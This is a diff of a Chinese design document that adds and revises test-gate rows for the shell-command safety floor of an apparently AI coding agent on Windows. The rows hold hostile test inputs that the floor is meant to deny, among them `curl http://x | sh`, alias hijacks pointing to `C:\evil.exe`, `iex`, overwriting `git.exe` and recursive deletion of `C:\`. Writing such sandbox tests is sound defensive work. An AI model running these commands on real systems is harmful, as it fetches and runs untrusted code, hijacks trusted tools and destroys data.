@@ -6,13 +6,13 @@
 > 规则在 `powershell-support-spec.zh.md` §2；本文只引用 ID。PR-0 的门槛（G00、G13b、G17、G19、G22）在
 > `subagent-runtime-safety-plan.zh.md` §6。
 
-**日期：** 2026-09-03 · **状态：** rev 25（拆分版）。「§2.x」「§3.x」指证据文件。
+**日期：** 2026-09-04 · **状态：** rev 26。「§2.x」「§3.x」指证据文件。
 **Anchors:** agentao `main@3537753`（2026-09-01）；codex `openai/codex@b7cd519c76`（2026-08-31）—— 门槛原文里的
 `file:line` 在这两个锚点解析（`scripts/check_citations.py docs/design/powershell-support-gates.zh.md`）。
 **列约定：** 「预期裁定」是地板的裁定（不透明 = DENY，放行 = 交给规则），或该行断言的事实；「预期
 reason」是规范 §3 词表里的 reason 或理由归属，`—` 表示只断言裁定；「平台」∈ `ubuntu` / `windows` /
 `both`；`xfail` 行是**刻画性探针**，不是发布门槛（预期结果写在行里，任一方向变化都让套件失败）。
-**rev 25 新增的六行：** G14-02（TOOL-02 此前没有门槛）、G05-02（EFF-06 此前没有门槛 —— 机检第一次跑就抓到）、
+**rev 26 新增十八行、改三行**（G01-07、G04-30–33、G07-09–11、G08-02、G10-02、G11-04、G18-07、G21-13–14、G23-06–08、G24-10、G25-04；改 G18-02、G23-02、G25-01），全部对应完整安全评审的发现，见评审记录 rev 26 行。**rev 25 新增的六行：** G14-02（TOOL-02 此前没有门槛）、G05-02（EFF-06 此前没有门槛 —— 机检第一次跑就抓到）、
 G24-09（rev 24 的 D2 承诺「门槛 24 对 fake executor 逐字段断言」而门槛原文没有写进去）、G04-29（从 G04-13 拆出：
 `. ./evil.ps1` 与 `& ./evil.ps1` 的可达理由是第 5 步，不是 `executes_input`）、G07-08（WRAP-07 前缀运行者）与
 G18-06（ENV-03 在每一级）；其余每一行都拆自 rev 24 的门槛原文。
@@ -27,6 +27,7 @@ G18-06（ENV-03 在每一级）；其余每一行都拆自 rev 24 的门槛原�
 | G01-04 | SPEC-02 | 每个合法的「方言 × rung」配对 | spec 构造成功 | — | ubuntu / PR-1 |
 | G01-05 | SPEC-02 | `POWERSHELL × system_posix`；不认识的 rung | spec 构造失败并点名配对 | — | ubuntu / PR-1 |
 | G01-06 | SPEC-02 | 非法配对漏到地板；body 不命中任何 POSIX 模式 | DENY | `hardline:unknown-rung-opaque` | ubuntu / PR-1 |
+| G01-07 | SPEC-07 | 对已构造的 `ShellSpec` 的任何字段赋值；`add_tool(replace=True)` 换入新 provider | 赋值抛错；换入后工具实例持有**新对象**，旧引用不变 | — | ubuntu / PR-1 |
 | G02-01 | IMG-06 | 每个方言的每一条地板测试 | 在 ubuntu 上运行，解析器来自 `dev` 组，oracle 为桩 | — | ubuntu / PR-2 |
 | G03-01 | CMD-01、LOWER-01 | §3.5 的 18 类 | 每类有 PowerShell 翻译与 CMD 行，或明写的一行 | — | ubuntu / PR-2 |
 | G03-02 | LOWER-02 | 接受表里的每一个 kind | 由钉住的解析器对某个输入产出；改名的语法升级挂在这里 | — | ubuntu / PR-2 |
@@ -59,6 +60,10 @@ G18-06（ENV-03 在每一级）；其余每一行都拆自 rev 24 的门槛原�
 | G04-27 | LOWER-01 | 普通 `# comment` 后跟同一个词 | 放行 | — | ubuntu / PR-2 |
 | G04-28 | LOWER-04 | 24 条非 `null` 行，含 `a \| b`、`a; b` 与行尾注释 | 整个降级出的 argv 与 `expected` 相等 | — | ubuntu / PR-2 |
 | G04-29 | LOWER-02、WRAP-04 | `. ./evil.ps1`、`& ./evil.ps1`：作为唯一命令、作为最后一条、后跟 `git status` | 不透明 | 第 5 步，节点 kind（`command_invokation_operator` / `command_name_expr` 不在接受清单）—— **不是** `executes_input`，那条到不了 | ubuntu / PR-2 |
+| G04-30 | EFF-08 | `git -c core.pager=C:\evil.exe log`、`git --exec-path=C:\x status`、`python -c 'import os'`、`node -e 'x'`、`explorer C:\x.lnk` | 不透明 | `executes_input`，命中各条目登记的 `execution_triggers` | ubuntu / PR-2 |
+| G04-31 | EFF-02 | `Get-Content x \| iex`；`iex (Get-Content x)` | 不透明 | 前者 `executes_input`（管道供给、非字面目标）；后者第 5 步（括号表达式 kind） | ubuntu / PR-2 |
+| G04-32 | EFF-02、WRAP-04 | `iex 'git status'`；`iex 'Set-Alias git C:\evil.exe'; git status` | 前者放行（4a 重新进入）；后者不透明 | 后者：重新进入后的 `rebinds_after` | ubuntu / PR-2 |
+| G04-33 | EFF-01、EFF-07 | `Set-Alias git C:\evil.exe; git status`、`New-Alias`、`Set-Variable` 各后跟 `git status` | 不透明 | `rebinds_after` —— 条目自己的标志，不是 EFF-05（这些不点名 provider 驱动器） | ubuntu / PR-2 |
 | G05-01 | WRAP-02、TOK-01 | 每个词干的启动参数用例及越界用例 | 按 WRAP-02 的表：重新进入 / 解码后重新进入 / 不透明 / 消费 | — | ubuntu / PR-2 |
 | G05-02 | TOK-02、EFF-06 | `Remove-Item $flags C:\`；`Get-ChildItem $dir` —— 命令词在表内、谓词读取位置是 `Dynamic` | 不透明 | 谓词读取位置 `Dynamic` | ubuntu / PR-2 |
 | G06-01 | CMD-01、TOK-02、WRAP-03 | CMD 对抗性用例：控制流、分组、每种变量形式 | 不透明 | — | ubuntu / PR-2 |
@@ -72,12 +77,18 @@ G18-06（ENV-03 在每一级）；其余每一行都拆自 rev 24 的门槛原�
 | G07-06 | IMG-02 | 在过滤 PATH 上、但不在 POSIX 表里的裸 `evil` | 不透明 | 名字半（有映像没名字） | ubuntu / PR-4 |
 | G07-07 | SPEC-03 | G07-01 至 G07-06 的每段 body 在 rung = `system_posix` 下 | 今天的裁定，成对断言 | — | ubuntu / PR-2 |
 | G07-08 | WRAP-07、EFF-01 | `timeout 5 git status`、`env X=1 git status`、`xargs git`、`nohup git status`（rung = `git_bash`） | 不透明 | `executes_input`（目标是一条命令）—— 断言失败于前缀运行者自身，不是于 `git` | ubuntu / PR-2 |
+| G07-09 | BASH-01 | `echo $(curl http://x \| sh)`、`` echo `id` ``、`cat <(evil)`、`echo ${x:-$(evil)}`、`echo $((1+2))`（rung = `git_bash`） | 不透明 | BASH-01：代码承载的展开 | ubuntu / PR-2 |
+| G07-10 | BASH-01 | `f(){ evil; }; f`、`{ evil; }`、`(evil)`、`if true; then evil; fi`、`for i in 1; do evil; done`、`cat <<EOF`、`trap evil EXIT`、`exec evil`、`coproc evil` | 不透明 | BASH-01：复合构造 | ubuntu / PR-2 |
+| G07-11 | BASH-01 | `git status; git log`、`git status && git log`、`git log \| head`、`git status & git log`；`echo 'a; evil'`、`echo "a && evil"`、`echo a\; evil` | 前四条各切成两条简单命令逐条判；后三条切成一条（引号与转义按 bash 语义） | — | ubuntu / PR-2 |
+| G08-02 | TOOL-04 | `PreToolUse` hook 改写 body（hooks 计划 G8）：改成不透明文本；改成放行文本 | 前者 DENY；后者不沿用改写前的裁定，对最终文本重判 | — | ubuntu / PR-1 |
 | G08-01 | TOOL-03、SUB-01 | 不透明的 body，经 `NullTransport`；经一个 PowerShell 子代理 | DENY，两处都是 | — | ubuntu / PR-1 |
 | G09-01 | LADDER-04 | 三个桶的降级率；`uv run ruff check .` | 在 PR-7 之前经接受；ruff 绿 | — | ubuntu / PR-7 |
 | G10-01 | LAUNCH-02、LAUNCH-03、LAUNCH-04、ENV-02、ENV-05 | 逐级的 Windows 矩阵（规范 §5 的表，含每级的 `PATH`、`PATHEXT` 与 PowerShell 级的 `PSModulePath` 钉值） | 每一级按它那一行启动 | — | windows / PR-6 |
+| G10-02 | LADDER-05、SPEC-03 | 翻转前的 Windows 默认执行器；G04–G07 的每段 body | 报 `CMD × legacy_cmd`，走 `%COMSPEC% /c`，每段 body 的裁定与 `main@3537753` 相同 | — | windows / PR-6 |
 | G11-01 | LADDER-01、LADDER-02 | `allow_git_bash` 关着 | 阶梯止于 `cmd` | — | ubuntu / PR-4 |
 | G11-02 | LADDER-02 | 开着且 Git Bash 在场 | 选 Git Bash，排在 `cmd` 之前 | — | ubuntu / PR-4 |
 | G11-03 | LADDER-02 | 开着且 Git Bash 不在场 | 回退 `cmd` | — | ubuntu / PR-4 |
+| G11-04 | LADDER-05 | PR-7 之后一个报 `legacy_cmd` 的 spec | 构造失败并点名；漏到地板 ⇒ DENY | `hardline:unknown-rung-opaque` | ubuntu / PR-7 |
 | G12-01 | CFG-01 | `settings.json` / 项目文件里的 `shell` 块 | 被忽略 | — | ubuntu / PR-3 |
 | G13-01 | CFG-03 | embedding factory、ACP `session_new`、ACP `session_load` | 同一份 `PermissionConfig` 快照抵达每个 root | — | ubuntu / PR-3 |
 | G14-01 | CFG-02 | 缺 provider；两个来源各出半份 spec | 被拒 | — | ubuntu / PR-3 |
@@ -85,11 +96,12 @@ G18-06（ENV-03 在每一级）；其余每一行都拆自 rev 24 的门槛原�
 | G15-01 | IMG-04 | 工作树里的二进制 | 不解析 | — | ubuntu / PR-4 |
 | G16-01 | CFG-02 | 构造参数与用户级 `shell` 块同时给出 | 按来源整体优先，低来源被忽略 | — | ubuntu / PR-3 |
 | G18-01 | ENV-04 | cmd rung 的子进程 | `NoDefaultCurrentDirectoryInExePath=1` | — | windows / PR-6 |
-| G18-02 | LAUNCH-02、LAUNCH-03 | 哨兵 body | 子进程收到的 body 与地板扫过的逐字节一致 | — | windows / PR-6 |
+| G18-02 | LAUNCH-02、LAUNCH-03 | 哨兵 body，含非 ASCII、`%`、`"`、换行与 `^` | 子进程收到的 body 与地板扫过的逐字节一致；观测手段写明（若靠 `$MyInvocation.Line` 自报，量的是引号不是身份） | — | windows / PR-6 |
 | G18-03 | ENV-01、ENV-02 | 子进程 `PATH` 与 `PATHEXT`；机器 PATH 上一个用户可写的目录 | 如钉；该目录不在子进程 `PATH` | — | windows / PR-6 |
 | G18-04 | ENV-02 | 同目录 `git.cmd` 与 `git.exe` | 跑 `.exe` | — | windows / PR-6 |
 | G18-05 | LAUNCH-03 | 含空格的 cmd 路径 | 按该解释器调用 | — | windows / PR-6 |
 | G18-06 | ENV-03 | `pwsh` 与 `cmd` rung 的子进程，父环境导出 `BASH_FUNC_git%%` 并设 `BASH_ENV`；一条可信 `git` 经 `!` 别名再起 `sh.exe` | 那个 `sh` 的环境里没有任何 `BASH_FUNC_*`、`BASH_ENV`、`ENV` —— 清除不限于 bash rung | — | windows / PR-6 |
+| G18-07 | LAUNCH-08 | 组装后超过 32767 WCHAR 的命令行 | 分析之前拒绝，不截断，不启动 | `hardline:<dialect>-opaque:launch-oversize` | windows / PR-6 |
 | G20-01 | ENV-03 | 父环境 `BASH_ENV` 指向工作树文件 | 子进程只跑 body | — | windows / PR-6 |
 | G20-02 | ENV-03、LAUNCH-04 | 父环境导出 `BASH_FUNC_git%%` | 裸 `git` 是 `/usr/bin/git`，不是那个函数 | — | windows / PR-6 |
 | G20-03 | ENV-03 | 一条可信命令自己再跑 `/bin/sh -c` | 那个环境里没有任何 `BASH_FUNC_*` —— `-p` 单独给不了 | — | windows / PR-6 |
@@ -110,11 +122,16 @@ G18-06（ENV-03 在每一级）；其余每一行都拆自 rev 24 的门槛原�
 | G21-10 | IMG-08 | **探针 (a)**：预检之后装上的配置 | `xfail`：启动哨兵预期**存在**（脚本跑在前奏之前），body 的副作用不发生 | — | windows / PR-6 |
 | G21-11 | IMG-07 | **探针 (b)**：记录字段与记录哈希全都对上的替换体 | `xfail`：预期**测不出来** | — | windows / PR-6 |
 | G21-12 | LAUNCH-06 | `<C-check>` 表达式 | 记录是「找到了子进程内的写法」还是「三个来源都没发现配置」 | — | windows / PR-6 |
+| G21-13 | ENV-02 | 可信目录里 `git.ps1` 与 `git.exe` 并存，`PATHEXT=.COM;.EXE` | 实测裸 `git` 解析到哪一个；答案写进 ENV-02 | — | windows / PR-6 |
+| G21-14 | IMG-08 | `powershell.exe` 5.1 | 三来源读取只见 Group Policy；LAUNCH-06 的例外按构造成立，`<C>` 省略且该级不被拒 | — | windows / PR-6 |
 | G23-01 | IMG-05 | 丢进「恰好在机器 PATH 上的用户可写目录」的 `pwsh.exe`，body 会写哨兵文件 | 永不自动选中；哨兵文件不存在（没被启动） | — | windows / PR-6 |
-| G23-02 | IMG-05 | 同一个二进制经 `shell.path` 显式点名 | 被选中 | — | windows / PR-6 |
+| G23-02 | IMG-05、IMG-01 | 同一个二进制经 `shell.path` 显式点名，仍在用户可写目录 | 拒绝，点名 IMG-01（(b) 免签名，不免位置）；把它放到主体写不了的目录、无签名、经 `shell.path` 点名 ⇒ 被选中 | — | windows / PR-6 |
 | G23-03 | IMG-05 | 已知安装位置里没有签名的映像 | 拒 | — | windows / PR-6 |
 | G23-04 | IMG-08 | launcher 所在目录不是 `$PSHOME`（shim、符号链接、拷贝） | AllUsers 配置从宿主侧解析出的安装根读；解析不出则拒绝该级 | — | windows / PR-6 |
 | G23-05 | IMG-01、IMG-02 | 主体写不了的根下、可信表有条目的 `git.exe`，对子进程 token 做真实 ACL 检查，无签名、不在 allowlist | 放行 | — | windows / PR-6 |
+| G23-06 | IMG-01、IMG-06 | 只读的 `D:\tools\vendor\bin\git.exe`，而 `D:\tools` 对主体可写（可重命名） | 不透明 | 映像半：可写的祖先 | windows / PR-6 |
+| G23-07 | IMG-06 | 主体写不了的目录里一个指向用户目录的 junction / symlink / app execution alias；及其反向 | 不透明，两个方向都是 | 映像半：链上的 reparse 目标或别名所在目录可写 | windows / PR-6 |
+| G23-08 | IMG-06、IMG-03 | `C:\PROGRA~1\Git\cmd\git.exe`、大小写变体、尾随点、`\\?\` 前缀；`git.exe:ads` | 前四种与规范拼法裁定相同，且 allowlist pin 生效；ADS 不透明 | — | windows / PR-6 |
 | G24-01 | WRAP-01 | `pwsh -NoProfile -Command "git status"` | 不透明 | 嵌套解释器启动 | ubuntu / PR-2 |
 | G24-02 | WRAP-01 | `pwsh -Command "Remove-Item -Recurse -Force C:\"` | 不透明 | 重新进入后的危险表命中（§3.6） | ubuntu / PR-2 |
 | G24-03 | WRAP-01 | `cmd /c git status`；`bash -c 'git status'` | 不透明 | 嵌套解释器启动 | ubuntu / PR-2 |
@@ -124,9 +141,11 @@ G18-06（ENV-03 在每一级）；其余每一行都拆自 rev 24 的门槛原�
 | G24-07 | SPEC-05、IMG-06 | 反过来：地板 PATH 上有、目标 PATH 上没有 | 不透明 | 映像半 | ubuntu / PR-4 |
 | G24-08 | WRAP-05 | `Start-Job { … }`，本机与非本机 | 不透明，两边都是 | 另起进程 | ubuntu / PR-2 |
 | G24-09 | LAUNCH-01 | 一个 fake executor | 逐字段断言启动请求：判别体（`argv` 或 `application_name` + `command_line`）、环境、`execution_subject`、`attested_images` —— 不只是「解析发生过」 | — | ubuntu / PR-1 |
-| G25-01 | IMG-01、LADDER-03 | agentao 以管理员或容器 `root` 运行；`Copy-Item .\evil.exe 'C:\Program Files\Git\cmd\git.exe'; git status` | 该级被拒绝；任何一步都不得走到「放行」 | 可信集为空 | both / PR-6 |
+| G24-10 | LAUNCH-01、SPEC-05 | 非本机执行器，目标 PATH 与地板 PATH 不同 | `env_delta` 按 oracle 答出的目标 PATH 条目算出，执行器施加到目标的基础环境；请求里没有地板机器的 PATH | — | ubuntu / PR-4 |
+| G25-01 | IMG-01、LADDER-03 | agentao 以管理员或容器 `root` 运行；`Copy-Item .\evil.exe 'C:\Program Files\Git\cmd\git.exe'; git status` | 该级被拒绝；任何一步都不得走到「放行」 | 可信集为空 | windows / PR-6 |
 | G25-02 | IMG-01 | 非特权时同一段 body | 放行；拷贝在 OS 层失败，跑起来的是可信的 `git` | — | windows / PR-6 |
 | G25-03 | LADDER-03 | 每一级都被拒绝 | 每次 shell 调用返回 reason，工具仍注册着，不退回 `%COMSPEC% /c` | `hardline:no-trusted-rung-opaque` | ubuntu / PR-4 |
+| G25-04 | IMG-01 | ubuntu：注入 oracle 桩、rung = `pwsh` 的 spec，每个候选根都答「能写」 | 该级被拒绝；阶梯走空 ⇒ LADDER-03 | `hardline:no-trusted-rung-opaque` | ubuntu / PR-4 |
 | G26-01 | WRAP-05 | `Start-Process git` | 不透明 | ShellExecute 不是 NAME-02 的解析器 | ubuntu / PR-2 |
 | G26-02 | WRAP-05 | `Start-Process -UseNewEnvironment git` | 不透明 | 环境：装回过滤前的用户 `PATH` | ubuntu / PR-2 |
 | G26-03 | WRAP-05 | `Start-Process -Verb RunAs git` | 不透明 | 主体 | ubuntu / PR-2 |
